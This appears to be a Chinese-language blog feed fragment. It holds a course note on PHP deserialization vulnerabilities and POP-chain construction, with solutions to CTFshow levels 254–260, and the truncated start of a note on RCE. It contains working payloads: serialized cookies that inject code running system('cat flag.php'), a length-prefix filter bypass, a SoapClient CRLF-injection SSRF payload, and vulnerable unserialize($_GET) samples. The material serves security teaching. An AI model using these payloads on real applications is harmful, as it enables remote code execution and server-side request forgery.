    <id>http://example.com/2023/02/03/Day45-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-POP%E9%93%BE%E6%9E%84%E9%80%A0-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95-%E5%8E%9F%E7%94%9F%E7%B1%BB/</id>
    <published>2023-02-02T17:41:32.000Z</published>
    <updated>2023-03-11T02:50:28.778Z</updated>
    
    <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、什么是反序列化操作？-格式转换</p><p>2、为什么会出现安全漏洞？-魔术方法</p><p>3、反序列化漏洞如何发现？ -对象逻辑</p><p>4、反序列化漏洞如何利用？-POP链构造</p><p>补充：反序列化利用大概分类三类</p><p>-魔术方法的调用逻辑-如触发条件</p><p>-语言原生类的调用逻辑-如SoapClient</p><p>-语言自身的安全缺陷-如CVE-2016-7124</p><h3 id="反序列化课程点："><a href="#反序列化课程点：" class="headerlink" title="#反序列化课程点："></a>#反序列化课程点：</h3><p>-PHP&amp;Java&amp;Python</p><p>序列化：对象转换为数组或字符串等格式</p><p>反序列化：将数组或字符串等格式转换成对象</p><p>serialize()     &#x2F;&#x2F;将一个对象转换成一个字符串</p><p>unserialize()   &#x2F;&#x2F;将字符串还原成一个对象</p><h3 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="#PHP反序列化漏洞"></a>#PHP反序列化漏洞</h3><p>原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL注入，目录遍历等不可控后果。在反序列化的过程中自动触发了某些魔术方法。当进行反序列化的时候就有可能会触发对象中的一些魔术方法。</p><h3 id="魔术方法利用点分析："><a href="#魔术方法利用点分析：" class="headerlink" title="#魔术方法利用点分析："></a>#魔术方法利用点分析：</h3><p>触发：unserialize函数的变量可控，文件中存在可利用的类，类中有魔术方法：</p><p>__construct(): &#x2F;&#x2F;构造函数，当对象new的时候会自动调用</p><p>__destruct()：&#x2F;&#x2F;析构函数当对象被销毁时会被自动调用</p><p>__wakeup(): &#x2F;&#x2F;unserialize()时会被自动调用</p><p>__invoke(): &#x2F;&#x2F;当尝试以调用函数的方法调用一个对象时，会被自动调用</p><p>__call(): &#x2F;&#x2F;在对象上下文中调用不可访问的方法时触发</p><p>__callStatci(): &#x2F;&#x2F;在静态上下文中调用不可访问的方法时触发</p><p>__get(): &#x2F;&#x2F;用于从不可访问的属性读取数据</p><p>__set(): &#x2F;&#x2F;用于将数据写入不可访问的属性</p><p>__isset(): &#x2F;&#x2F;在不可访问的属性上调用isset()或empty()触发</p><p>__unset(): &#x2F;&#x2F;在不可访问的属性上使用unset()时触发</p><p>__toString(): &#x2F;&#x2F;把类当作字符串使用时触发</p><p>sleep(): &#x2F;&#x2F;serialize()函数会检查类中是否存在一个魔术方法 sleep() 如果存在，该方法会被优先调用</p><p><img src="/../images/Day45-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-POP%E9%93%BE%E6%9E%84%E9%80%A0-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95-%E5%8E%9F%E7%94%9F%E7%B1%BB/0.png" alt="img"></p><p><img src="/../images/Day45-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-POP%E9%93%BE%E6%9E%84%E9%80%A0-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95-%E5%8E%9F%E7%94%9F%E7%B1%BB/0-16754039660173.png" alt="img"></p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ 反序列化-魔术方法&amp;漏洞引发&amp;变量修改等</p><p>➢ CTFSHOW-关卡254到260-原生类&amp;POP构造</p><p>➢ CMS代码审计-Typecho反序列化&amp;魔术方法逻辑</p><h3 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h3><h4 id="反序列化-魔术方法-amp-漏洞引发-amp-变量修改等"><a href="#反序列化-魔术方法-amp-漏洞引发-amp-变量修改等" class="headerlink" title="#反序列化-魔术方法&amp;漏洞引发&amp;变量修改等"></a>#反序列化-魔术方法&amp;漏洞引发&amp;变量修改等</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//序列化&amp;反序列化</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demotest</span></span>&#123;</span><br><span class="line">​<span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;xiaodi&#x27;</span>;</span><br><span class="line">​<span class="keyword">public</span> <span class="variable">$sex</span>=<span class="string">&#x27;man&#x27;</span>;</span><br><span class="line">​<span class="keyword">public</span> <span class="variable">$age</span>=<span class="string">&#x27;29&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$example</span>=<span class="keyword">new</span> <span class="title function_ invoke__">demotest</span>()</span><br><span class="line"><span class="variable">$s</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$example</span>);<span class="comment">//序列化</span></span><br><span class="line"><span class="variable">$u</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$s</span>);<span class="comment">//反序列化</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$u</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//O:8:&quot;demotest&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;xiaodi&quot;;s:3:&quot;sex&quot;;s:3:&quot;man&quot;;s:3:&quot;age&quot;;s:2:&quot;29&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//object(demotest)#2 (3) &#123; [&quot;name&quot;]=&gt; string(6) &quot;xiaodi&quot; [&quot;sex&quot;]=&gt; string(3) &quot;man&quot; [&quot;age&quot;]=&gt; string(2) &quot;29&quot; &#125;</span></span><br></pre></td></tr></table></figure><h6 id="x2F-x2F-安全问题"><a href="#x2F-x2F-安全问题" class="headerlink" title="&#x2F;&#x2F;安全问题"></a>&#x2F;&#x2F;安全问题</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">​<span class="keyword">public</span> <span class="variable">$var</span>=<span class="string">&#x27;echo test&#x27;</span>;</span><br><span class="line">​    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">​        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>;</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">​        <span class="keyword">echo</span> <span class="string">&#x27;x&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">​<span class="keyword">echo</span> <span class="string">&#x27;__construct&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">​&#125;</span><br><span class="line"></span><br><span class="line">​<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">​<span class="keyword">return</span> <span class="string">&#x27;__toString&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">​&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//无需函数，创建对象触发魔术方法</span></span><br><span class="line"><span class="comment">//$a=new A();//触发__construct</span></span><br><span class="line"><span class="comment">//$a-&gt;test();//触发test</span></span><br><span class="line"><span class="comment">//echo $a;//触发__toString</span></span><br><span class="line"><span class="comment">//触发__destruct</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$t</span>=<span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:1:&quot;A&quot;:1:&#123;s:3:&quot;var&quot;;s:9:&quot;echo test&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="variable">$t</span>-&gt;<span class="title function_ invoke__">test</span>();</span><br></pre></td></tr></table></figure><h6 id="x2F-x2F-漏洞出现"><a href="#x2F-x2F-漏洞出现" class="headerlink" title="&#x2F;&#x2F;漏洞出现"></a>&#x2F;&#x2F;漏洞出现</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">​    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">​<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ipconfig&#x27;</span>);</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">​<span class="keyword">echo</span> <span class="string">&#x27;xiaodisec&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">​&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="x2F-x2F-函数引用，无对象创建触发魔术方法"><a href="#x2F-x2F-函数引用，无对象创建触发魔术方法" class="headerlink" title="&#x2F;&#x2F;函数引用，无对象创建触发魔术方法"></a>&#x2F;&#x2F;函数引用，无对象创建触发魔术方法</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//?x=O:1:&quot;B&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;ver&quot;;&#125;</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[x]);</span><br><span class="line"><span class="comment">//$b=new b();</span></span><br><span class="line"><span class="comment">//echo serialize($b);</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">​<span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&#x27;ipconfig&#x27;</span>;</span><br><span class="line">​    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">​<span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">​<span class="keyword">echo</span> <span class="string">&#x27;xiaodisec&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">​&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">###### //函数引用</span></span><br></pre></td></tr></table></figure><h6 id="x2F-x2F-无对象创建触发魔术方法自定义变量"><a href="#x2F-x2F-无对象创建触发魔术方法自定义变量" class="headerlink" title="&#x2F;&#x2F;无对象创建触发魔术方法自定义变量"></a>&#x2F;&#x2F;无对象创建触发魔术方法自定义变量</h6><p>&#x2F;&#x2F;?c&#x3D;O:1:”C”:1:{s:3:”cmd”;s:3:”ver”;}</p><p>unserialize($_GET[c]);</p><p>?&gt;</p><h4 id="CTFSHOW-关卡254到260-原生类-amp-POP构造"><a href="#CTFSHOW-关卡254到260-原生类-amp-POP构造" class="headerlink" title="#CTFSHOW-关卡254到260-原生类&amp;POP构造"></a>#CTFSHOW-关卡254到260-原生类&amp;POP构造</h4><h5 id="254-对象引用执行逻辑"><a href="#254-对象引用执行逻辑" class="headerlink" title="254-对象引用执行逻辑"></a>254-对象引用执行逻辑</h5><p>username&#x3D;xxxxxx&amp;password&#x3D;xxxxxx</p><h5 id="255-反序列化变量修改1"><a href="#255-反序列化变量修改1" class="headerlink" title="255-反序列化变量修改1"></a>255-反序列化变量修改1</h5><p>Code:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>Get:username&#x3D;xxxxxx&amp;password&#x3D;xxxxxx</p><p>Cookie:user&#x3D;O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</p><h4 id="256-反序列化参数修改2"><a href="#256-反序列化参数修改2" class="headerlink" title="256-反序列化参数修改2"></a>256-反序列化参数修改2</h4><p>CODE:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;x&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;y&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>GET:username&#x3D;x&amp;password&#x3D;y</p><p>COOKIE:user&#x3D;O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%22x%22%3Bs%3A8%3A%22password%22%3Bs%3A1%3A%22y%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</p><h5 id="257-反序列化参数修改-amp-对象调用逻辑"><a href="#257-反序列化参数修改-amp-对象调用逻辑" class="headerlink" title="257-反序列化参数修改&amp;对象调用逻辑"></a>257-反序列化参数修改&amp;对象调用逻辑</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">​    <span class="keyword">private</span> <span class="variable">$class</span>;</span><br><span class="line">​    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">​        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">​    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">​    <span class="keyword">private</span> <span class="variable">$code</span>=<span class="string">&#x27;system(&quot;cat f*&quot;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>GET：username&#x3D;xxxxxx&amp;password&#x3D;xxxxxx</p><p>COOKIE：user&#x3D;O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A17%3A%22system%28%22cat+f%2A%22%29%3B%22%3B%7D%7D</p><h5 id="258-反序列化参数修改-amp-对象调用逻辑"><a href="#258-反序列化参数修改-amp-对象调用逻辑" class="headerlink" title="258-反序列化参数修改&amp;对象调用逻辑"></a>258-反序列化参数修改&amp;对象调用逻辑</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">​    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;backDoor&#x27;</span>;</span><br><span class="line">​    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">​        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">​    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">​    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&quot;system(&#x27;cat flag.php&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>());</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:11&#x27;</span>,<span class="string">&#x27;:+11&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:8&#x27;</span>,<span class="string">&#x27;:+8&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$c</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>GET：username&#x3D;xxxxxx&amp;password&#x3D;xxxxxx</p><p>COOKIE：user&#x3D;O%3A%2B11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A23%3A%22system%28%27cat+flag.php%27%29%3B%22%3B%7D%7D</p><h5 id="259-原生态类-amp-call魔术方法-amp-配合SSRF"><a href="#259-原生态类-amp-call魔术方法-amp-配合SSRF" class="headerlink" title="259-原生态类&amp;call魔术方法&amp;配合SSRF"></a>259-原生态类&amp;call魔术方法&amp;配合SSRF</h5><p>参考：<a href="https://dar1in9s.github.io/2020/04/02/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/#Exception">https://dar1in9s.github.io/2020/04/02/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/#Exception</a></p><p>生成序列化时记得开启SoapClient拓展：php.ini中启用php_soap.dll</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;token=ctfshow&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded&#x27;</span>.<span class="string">&#x27;^^Content-Length: &#x27;</span>.(<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,<span class="string">&#x27;uri&#x27;</span>=&gt; <span class="string">&quot;ssrf&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">vip=O%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>SoapClient%<span class="number">22</span>%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>uri%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>ssrf%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>location%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A25%<span class="number">3</span>A%<span class="number">22</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">2</span>Fflag.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>_user_agent%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A128%<span class="number">3</span>A%<span class="number">22</span>wupco%<span class="number">0</span>D%<span class="number">0</span>AX-Forwarded-For%<span class="number">3</span>A127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">2</span>C127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">0</span>D%<span class="number">0</span>AContent-Type%<span class="number">3</span>A+application%<span class="number">2</span>Fx-www-form-urlencoded%<span class="number">0</span>D%<span class="number">0</span>AContent-Length%<span class="number">3</span>A+<span class="number">13</span>%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>Atoken%<span class="number">3</span>Dctfshow%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>_soap_version%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><h5 id="260-字符串序列化"><a href="#260-字符串序列化" class="headerlink" title="260-字符串序列化"></a>260-字符串序列化</h5><p>ctfshow&#x3D;ctfshow_i_love_36D</p><h4 id="CMS代码审计-Typecho反序列化-amp-魔术方法逻辑"><a href="#CMS代码审计-Typecho反序列化-amp-魔术方法逻辑" class="headerlink" title="#CMS代码审计-Typecho反序列化&amp;魔术方法逻辑"></a>#CMS代码审计-Typecho反序列化&amp;魔术方法逻辑</h4><p><a href="https://www.anquanke.com/post/id/155306">https://www.anquanke.com/post/id/155306</a></p><p>搜反序列化关键字：unserialize</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;知识点：&quot;&gt;&lt;a href=&quot;#知识点：&quot; class=&quot;headerlink&quot; title=&quot;#知识点：&quot;&gt;&lt;/a&gt;#知识点：&lt;/h3&gt;&lt;p&gt;1、什么是反序列化操作？-格式转换&lt;/p&gt;
&lt;p&gt;2、为什么会出现安全漏洞？-魔术方法&lt;/p&gt;
&lt;p&gt;3、反序列化漏洞如</summary>
      
    
    
    
    <category term="Web攻防" scheme="http://example.com/categories/Web%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>Day44 WEB攻防-通用漏洞&amp;RCE&amp;代码执行&amp;命令执行&amp;多层面检测利用</title>
    <link href="http://example.com/2023/01/31/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/"/>
    <id>http://example.com/2023/01/31/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/</id>
    <published>2023-01-31T09:04:25.000Z</published>
    <updated>2023-03-11T02:55:51.606Z</updated>
    
    <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、RCE执行-代码执行&amp;命令执行</p><p>2、CTF考点-漏洞配合&amp;绕过手法</p><p>3、利用审计-CMS框架&amp;中间件等</p><h3 id="详细点："><a href="#详细点：" class="headerlink" title="#详细点："></a>#详细点：</h3><p>1.为什么会产生此类安全问题</p><p>2.此类安全问题探针利用及危害</p><p>3.此类安全问题在CTF即CMS分析</p><p>漏洞场景：代码会调用自身的脚本代码执行，也会调用系统命令执行</p><p>漏洞区别：脚本语言&amp;操作系统(php&#x2F;java&#x2F;python&#x2F;js&amp;windows&#x2F;linux&#x2F;mac)</p><p>漏洞对象：WEB源码&amp;中间件&amp;其他环境（见漏洞详情对象）</p><p>漏洞危害：直接权限丢失,可执行任意脚本代码或系统命令</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ RCE-原理&amp;探针&amp;利用&amp;危害等</p><p>➢ CTF-29~39-RCE代码命令执行</p><p>➢ CMS-PbootCMS审计-RCE执行</p><p>➢ 层面-探针-语言&amp;CMS&amp;中间件等</p><h2 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h2><h4 id="RCE-原理-amp-探针-amp-利用-amp-危害等"><a href="#RCE-原理-amp-探针-amp-利用-amp-危害等" class="headerlink" title="#RCE-原理&amp;探针&amp;利用&amp;危害等"></a>#RCE-原理&amp;探针&amp;利用&amp;危害等</h4><p>举例:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//eval代码执行</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>);</span><br><span class="line"><span class="comment">//system命令执行,调用系统的命令执行</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;ipconfig&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>-RCE代码执行：引用脚本代码解析执行</p><p>-RCE命令执行：脚本调用操作系统命令</p><p>漏洞函数：</p><p>1.PHP：</p><p>eval()、assert()、preg_replace()、call_user_func()、call_user_func_array()以及array_map()等</p><p>system、shell_exec、popen、passthru、proc_open等</p><p>2.Python：</p><p>eval exec subprocess os.system commands </p><p>3.Java：</p><p>Java中没有类似php中eval函数这种直接可以将字符串转化为代码执行的函数，</p><p>但是有反射机制，并且有各种基于反射机制的表达式引擎，如: OGNL、SpEL、MVEL等.</p><h4 id="CTF-29-39-RCE代码命令执行"><a href="#CTF-29-39-RCE代码命令执行" class="headerlink" title="#CTF-29~39-RCE代码命令执行"></a>#CTF-29~39-RCE代码命令执行</h4><h6 id="29-通配符"><a href="#29-通配符" class="headerlink" title="29-通配符"></a>29-通配符</h6><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230201181934956.png" alt="image-20230201181934956"></p><p>system(‘tac fla*.php’);</p><p><img src="/../images/Day44-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/image-20230201181750045.png" alt="image-20230201181750045"></p><h6 id="30-取代函数-amp-通配符-amp-管道符"><a href="#30-取代函数-amp-通配符-amp-管道符" class="headerlink" title="30-取代函数&amp;通配符&amp;管道符"></a>30-取代函数&amp;通配符&amp;管道符</h6><p><img 